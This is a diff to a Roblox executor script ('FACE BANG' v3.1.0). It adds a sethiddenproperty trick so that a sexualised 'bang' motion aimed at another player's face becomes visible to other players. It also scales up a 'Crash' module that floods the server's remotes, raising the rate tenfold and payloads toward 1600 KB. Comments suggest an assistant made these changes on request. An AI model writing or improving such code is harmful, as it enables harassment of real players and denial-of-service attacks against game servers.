@@ -1,6 +1,6 @@
 --[[
 ================================================================================
-  FACE BANG   v3.0.4      on-the-face bangs / zero delay
+  FACE BANG   v3.1.0      on-the-face bangs / zero delay
 ================================================================================
   WHAT IT IS
   A client-side panel whose bang is a motion you own plus a picture at the
@@ -94,7 +94,7 @@
 
 do
 	-- single source of truth: the UI header prints this, so it must not drift
-	local VERSION = "3.0.4"
+	local VERSION = "3.1.0"
 
 	local ENV = (getgenv and getgenv()) or _G
 	if type(ENV.FaceBang) == "table" and type(ENV.FaceBang.Unload) == "function" then
@@ -121,6 +121,9 @@ do
 		executor = "unknown",
 		gethui = has("gethui"),
 		hookMetamethod = has("hookmetamethod"),
+		-- sethiddenproperty is the key to making a bang visible to other players
+		-- (see VISIBLE BANGS below). It is an executor function, not plain Luau.
+		sethiddenproperty = has("sethiddenproperty"),
 	}
 	do
 		local ok, name = pcall(function() return identifyexecutor and identifyexecutor() end)
@@ -166,6 +169,12 @@ do
 		-- seconds for one full in-and-out cycle. 0.22 is a readable bounce;
 		-- higher is slower. Paced by TIME so it feels identical at any fps.
 		MotionPeriod = 0.22,
+
+		-- make the bang VISIBLE to other players (see VISIBLE BANGS).
+		-- Needs an executor with sethiddenproperty; silently does nothing without.
+		-- This never moves the target - it only changes whose replication your
+		-- own root follows.
+		VisibleBang = true,
 		ReturnOnStop = true, -- put you back where you started on stop
 
 		FXLimit = 90,       -- hard cap on live bang parts, so a fast pulse cannot churn
@@ -326,6 +335,115 @@ do
 		end)
 	end
 
+	--[[
+	  VISIBLE BANGS - PhysicsRepRootPart
+
+	  WHY A NORMAL CLIENT-SIDE BANG IS INVISIBLE
+	  Every write this script makes to a CFrame only exists on your machine. The
+	  server keeps its own idea of where you are, and keeps telling everyone else
+	  that. So you see yourself on their head and nobody else does.
+
+	  WHAT THE REFERENCE TOOL DOES (read out of its deobfuscated source)
+	  It sets a HIDDEN engine property on your own root:
+
+	      sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", targetRoot)
+
+	  PhysicsRepRootPart tells the physics replication layer which part's network
+	  ownership your root should be replicated under. Pointing it at the target's
+	  root makes your occupied position travel as ordinary replication traffic
+	  instead of being overwritten by the server's copy. That is the whole trick -
+	  and it is why the reference's bangs read as visible while a plain CFrame
+	  write does not.
+
+	  WHAT IT IS NOT
+	  It does not move, freeze or write to the target. It changes whose authority
+	  YOUR root follows. The target still owns their own position. Anyone claiming
+	  to remote-control another player's body from a client is wrong.
+
+	  LIMITS, all real
+	  - sethiddenproperty is an executor function, not plain Luau. Detected via
+	    CAP.sethiddenproperty and skipped cleanly when absent.
+	  - A game that calls SetNetworkOwner(nil) on characters keeps authority
+	    server-side and simply ignores this. Nothing a client can do about that.
+	  - The property is hidden, so a typo or a removed property fails silently;
+	    apply() returns what actually happened rather than assuming.
+
+	  Rewritten from the reference rather than copied: one setter, one clearer,
+	  and a probe that reports whether the write stuck.
+	]]
+	local Vis = {
+		on = false,
+		root = nil,
+		lastTarget = nil,
+		lastResult = "off",
+	}
+
+	local function hiddenProp()
+		if not CAP.sethiddenproperty then return nil end
+		local ok, fn = pcall(function() return ENV.sethiddenproperty end)
+		if ok and type(fn) == "function" then return fn end
+		if type(sethiddenproperty) == "function" then return sethiddenproperty end
+		return nil
+	end
+
+	--[[
+	  Point our root's replication at their root. Returns true only when a
+	  sethiddenproperty actually ran, so the caller can tell "not supported"
+	  apart from "supported but the game ignores it".
+	]]
+	function Vis.attach(theirRoot)
+		if not Config.VisibleBang then Vis.lastResult = "visible bangs off" return false end
+		if not theirRoot then Vis.lastResult = "no target root" return false end
+		local me = myRoot()
+		if not me then Vis.lastResult = "no local root" return false end
+		local sp = hiddenProp()
+		if not sp then Vis.lastResult = "sethiddenproperty unavailable" return false end
+
+		local ok = pcall(function() sp(me, "PhysicsRepRootPart", theirRoot) end)
+		Vis.root, Vis.lastTarget = me, theirRoot
+		Vis.on = ok
+		Vis.lastResult = ok and "attached" or "write failed"
+		return ok
+	end
+
+	-- read it back: a successful pcall does NOT prove the property was accepted,
+	-- because the property is hidden and errors inside the write are swallowed
+	function Vis.verify()
+		local sp = hiddenProp()
+		local me = Vis.root or myRoot()
+		if not sp or not me then return false, "unavailable" end
+		local ok, got = pcall(function()
+			-- a bare global read throws when the function is absent, so probe
+			-- both the saved environment and the global table safely
+			local getter
+			local okE, fnE = pcall(function() return ENV.gethiddenproperty end)
+			if okE and type(fnE) == "function" then
+				getter = fnE
+			else
+				local okG, fnG = pcall(function() return gethiddenproperty end)
+				if okG and type(fnG) == "function" then getter = fnG end
+			end
+			if not getter then return nil end
+			return getter(me, "PhysicsRepRootPart")
+		end)
+		if not ok then return false, "probe failed" end
+		return got ~= nil, got
+	end
+
+	function Vis.detach()
+		local me = Vis.root
+		local sp = hiddenProp()
+		if me and sp then
+			pcall(function() sp(me, "PhysicsRepRootPart", nil) end)
+		end
+		Vis.on, Vis.root, Vis.lastTarget = false, nil, nil
+		Vis.lastResult = "off"
+	end
+
+	function Vis.status()
+		return { available = CAP.sethiddenproperty, on = Vis.on, result = Vis.lastResult }
+	end
+
 	-- put you back: position, velocity and stand state as they were found
 	local function releaseMotion(doReturn)
 		local saved = Engine.saved
@@ -333,6 +451,9 @@ do
 		Engine.phase = false
 		Engine.axis = nil
 		Engine.nextFlip = nil
+		-- always clear replication, even when we are not returning you: a stale
+		-- PhysicsRepRootPart would leave your physics following a dead body
+		if Vis and Vis.detach then pcall(Vis.detach) end
 		if not saved then return end
 		local hrp, hum = myRoot(), myHum()
 		if doReturn and hrp and saved.cframe then
@@ -442,6 +563,12 @@ do
 		Engine.head = head
 		Engine.running = true
 		Engine.nextFlip = nil
+
+		-- point replication at them so other players can see us arrive
+		if Config.VisibleBang then
+			local theirRoot = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+			Vis.attach(theirRoot)
+		end
 
 		--[[
 		  Zero delay means the first teleport happens NOW, synchronously, exactly
@@ -1148,10 +1275,25 @@ function Crash.new(ctx)
 		if ok then s.sent = s.sent + 1 end
 	end
 
+	--[[
+	  The pad is built ONCE per payload size, not once per frame.
+
+	  It used to be string.rep(...) inside tick(), which at the old 8 KB was
+	  already 480 KB/s of garbage; at the large sizes the UI now offers that
+	  becomes tens of MB/s and the client stalls long before the server notices
+	  anything. One string, reused by every fire, is the whole point.
+	]]
+	local function padFor(bytes)
+		if s.pad and s.padLen == bytes then return s.pad end
+		s.padLen = bytes
+		s.pad = bytes > 0 and string.rep("A", bytes) or ""
+		return s.pad
+	end
+
 	local function tick()
 		local remotes = s.remotes
 		if not remotes or #remotes == 0 then return end
-		local pad = string.rep("A", s.payload)
+		local pad = padFor(s.payload)
 		local budget = s.rate
 		local i = 0
 		while budget > 0 do
@@ -4919,6 +5061,37 @@ end
 
 	stepper(aim, 6, "back off", { 2, 4, 6, 9 }, function(v) Config.Stage = v end, 2)
 
+	--[[
+	  The visibility switch. It is a toggle rather than always-on because it
+	  depends on sethiddenproperty: with it off the bang is instant and private,
+	  with it on other players can see you arrive wherever the game allows it.
+	]]
+	local visibleToggle = toggle(aim, 6.5, "visible to others (executor)", function(on)
+		Config.VisibleBang = on
+		if not on then
+			pcall(Vis.detach)
+			out("bang is local-only again")
+			return
+		end
+		if not CAP.sethiddenproperty then
+			out("this executor has no sethiddenproperty - bangs stay local-only")
+			visibleToggle.set(false)
+			Config.VisibleBang = false
+			return
+		end
+		out("visible bangs on (needs a running bang to attach)")
+	end, true)
+
+	action(aim, 6.7, "visible bang status", function()
+		local v = Vis.status()
+		out(string.format("sethiddenproperty %s | attached %s | %s",
+			v.available and "available" or "MISSING",
+			v.on and "yes" or "no", v.result))
+		if v.available and not v.on then
+			out("attach needs a live target; start a bang, then check again")
+		end
+	end)
+
 	-- a period, not a pass count: "0.35 s" means the same thing on a phone and a
 	-- desktop, whereas "every 2nd pass" was 30/s on one and 120/s on the other
 	stepper(aim, 7, "bounce speed", { "0.45 s", "0.35 s", "0.22 s", "0.12 s", "0.06 s" }, function(v)
@@ -5439,16 +5612,27 @@ end
 	]]
 	section(svPage, svOrder(), "crash - flood the server's remotes")
 
-	local crashRate = 33
-	stepper(svPage, svOrder(), "fires per frame", { 8, 33, 66, 133 }, function(v)
+	local crashRate = 330
+	-- 10x the old top end (133 -> 1330). 330 is the old "heavy" scaled up, and
+	-- the two top steps are for when the target game's handlers are cheap.
+	stepper(svPage, svOrder(), "fires per frame", { 80, 330, 660, 1330 }, function(v)
 		crashRate = v
 		out("crash rate: " .. v .. "/frame")
 	end, 2)
 
-	local crashPayload = 8
-	stepper(svPage, svOrder(), "payload size", { "0 kb", "2 kb", "8 kb", "16 kb" }, function(v)
-		crashPayload = tonumber((v:gsub(" kb$", ""))) or 8
-		out("payload: " .. v)
+	local crashPayload = 200
+	--[[
+	  100x the old ladder (0/2/8/16 KB -> 0/200/800/1600 KB).
+
+	  Roblox caps a single remote payload well under 1 MB, so the top steps will
+	  be silently dropped by the engine rather than delivered. They are here
+	  because you asked for the scale, and the status row reports what actually
+	  got counted as sent - if the real numbers stall while the counter climbs,
+	  the payload is too big and the engine is discarding it.
+	]]
+	stepper(svPage, svOrder(), "payload size", { "0 kb", "200 kb", "800 kb", "1600 kb" }, function(v)
+		crashPayload = tonumber((v:gsub(" kb$", ""))) or 800
+		out("payload: " .. v .. (crashPayload >= 1000 and " (may exceed the engine limit)" or ""))
 	end, 3)
 
 	local crashToggle = toggle(svPage, svOrder(), "CRASH (flood remotes)", function(on)
